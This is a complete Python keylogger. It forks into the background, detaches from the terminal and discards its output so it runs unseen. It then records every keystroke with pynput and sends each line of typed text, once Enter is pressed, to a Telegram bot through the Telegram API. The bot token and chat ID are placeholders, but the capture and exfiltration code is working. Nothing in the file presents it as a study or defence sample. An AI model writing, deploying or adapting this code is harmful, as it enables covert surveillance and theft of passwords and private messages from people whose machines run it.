import os
import sys
import time
import requests
from pynput import keyboard

BOT_TOKEN = 'your-telegram-bot-token'
CHAT_ID = 'your-chat-id'

# Fork to background
if os.fork():
    sys.exit(0)

os.setsid()
with open(os.devnull, 'w') as fnull:
    os.dup2(fnull.fileno(), sys.stdout.fileno())
    os.dup2(fnull.fileno(), sys.stderr.fileno())

key_buffer = ""

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
    except:
        pass

def log_keys(key):
    global key_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_buffer += key.char
        elif key == keyboard.Key.space:
            key_buffer += ' '
        elif key == keyboard.Key.backspace:
            key_buffer = key_buffer[:-1]
        elif key == keyboard.Key.enter:
            if key_buffer.strip():
                send_to_telegram(f"Keystrokes:\n{key_buffer}")
            key_buffer = ""
    except:
        pass

listener = keyboard.Listener(on_press=log_keys)
listener.start()

while True:
    time.sleep(10)
